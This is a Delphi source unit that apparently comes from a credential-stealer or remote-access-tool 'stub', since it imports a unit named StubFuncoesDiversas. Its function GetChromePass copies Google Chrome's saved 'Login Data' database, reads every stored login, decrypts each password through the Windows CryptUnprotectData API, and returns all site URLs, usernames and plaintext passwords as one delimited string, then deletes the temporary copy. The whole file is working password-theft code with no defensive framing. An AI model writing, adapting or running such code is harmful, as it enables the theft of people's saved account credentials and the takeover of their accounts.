unit UnitChrome;

interface

uses
  windows;

function GetChromePass(sqlite3Dll: string; Delimitador: string): string;

implementation

uses
  SQLiteTable3,
  sqlite3,
  Classes,
  StubFuncoesDiversas;

type
  TCharArray = Array[0..1023] Of Char;
  _TOKEN_USER = record
    User: SID_AND_ATTRIBUTES;
  end;
  TOKEN_USER = _TOKEN_USER;
  TTokenUser = TOKEN_USER;
  PTokenUser = ^TOKEN_USER;
  _CREDENTIAL_ATTRIBUTEA = record
    Keyword: LPSTR;
    Flags: DWORD;
    ValueSize: DWORD;
    Value: PBYTE;
  end;
  PCREDENTIAL_ATTRIBUTE = ^_CREDENTIAL_ATTRIBUTEA;
_CREDENTIALA = record
    Flags: DWORD;
    Type_: DWORD;
    TargetName: LPSTR;
    Comment: LPSTR;
    LastWritten: FILETIME;
    CredentialBlobSize: DWORD;
    CredentialBlob: PBYTE;
    Persist: DWORD;
    AttributeCount: DWORD;
    Attributes: PCREDENTIAL_ATTRIBUTE;
    TargetAlias: LPSTR;
    UserName: LPSTR;
  end;
  PCREDENTIAL = array of ^_CREDENTIALA;
  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: LPCWSTR;
  end;
  PCRYPTPROTECT_PROMPTSTRUCT = ^_CRYPTPROTECT_PROMPTSTRUCT;
  _CRYPTOAPI_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;
  DATA_BLOB = _CRYPTOAPI_BLOB;
  PDATA_BLOB = ^DATA_BLOB;

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PLPWSTR; pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT; dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall; external 'crypt32.dll' Name 'CryptUnprotectData';

function StartGetChromePass(sqlite3Dll: string; Delimitador: string): string;
var
  DB: TSQLiteDatabase;
  Tablo: TSQLiteTable;
  Sifre: string;
  Giren: DATA_BLOB;
  Cikan: DATA_BLOB;
  DataStream: TMemorystream;
  Arquivo, TempFile: string;
begin
  result := '';
  merdadll := sqlite3Dll;
  Arquivo := GetShellFolder($001C) + '\Google\Chrome\User Data\Default\Login Data'; //ou "web data" no antigo 
  TempFile := MyTempFolder + inttostr(gettickcount) + '.tmp';
  if CopyFile(pchar(arquivo), pchar(TempFile), false) = false then exit;

  db := TSQLiteDatabase.Create(TempFile);
  tablo := DB.GetTable('SELECT * FROM logins');
  While not tablo.EOF do
  begin
    DataStream := TMemoryStream.Create;
    DataStream := tablo.FieldAsBlob(tablo.FieldIndex['password_value']);
    Giren.pbData := DataStream.Memory;
    Giren.cbData := DataStream.Size;
    CryptUnProtectData(@Giren, nil,nil,nil,nil,0,@Cikan);
    SetString(sifre, PAnsiChar(Cikan.pbData), Cikan.cbData);
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['origin_url']) + Delimitador;
    Result := Result + tablo.FieldAsString(tablo.FieldIndex['username_value']) + Delimitador;
    Result := Result + sifre + Delimitador + #13#10;
    Tablo.Next;
  end;
  DeleteFile(pchar(TempFile));
end;

function GetChromePass(sqlite3Dll: string; Delimitador: string): string;
begin
  Try
    result := StartGetChromePass(sqlite3Dll, Delimitador);
    except
    result := '';
  end;
end;

end.